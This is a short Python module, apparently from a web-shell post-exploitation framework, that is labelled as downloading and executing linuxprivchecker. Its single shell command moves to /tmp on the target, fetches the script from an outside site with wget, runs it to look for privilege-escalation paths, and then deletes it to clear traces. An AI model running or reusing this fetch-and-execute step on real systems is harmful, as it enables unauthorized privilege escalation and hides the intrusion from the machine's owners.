from core.vectors import ShellCmd, Os
from core.module import Module
from core import modules

class Linuxprivchecker(Module):

    """Dl and execute linuxprivchecker"""

    def init(self):

        self.register_info(
            {
                'author': [
                    'Ganapati'
                ],
                'license': 'GPLv3'
            }
        )

        self.register_arguments([])

    def run(self):

        pwdresult = ShellCmd('cd /tmp;wget www.securitysift.com/download/linuxprivchecker.py; python ./linuxprivchecker.py;rm /tmp/linuxprivchecker.py;').run()

        if not pwdresult: return
        return pwdresult.rstrip('\n')
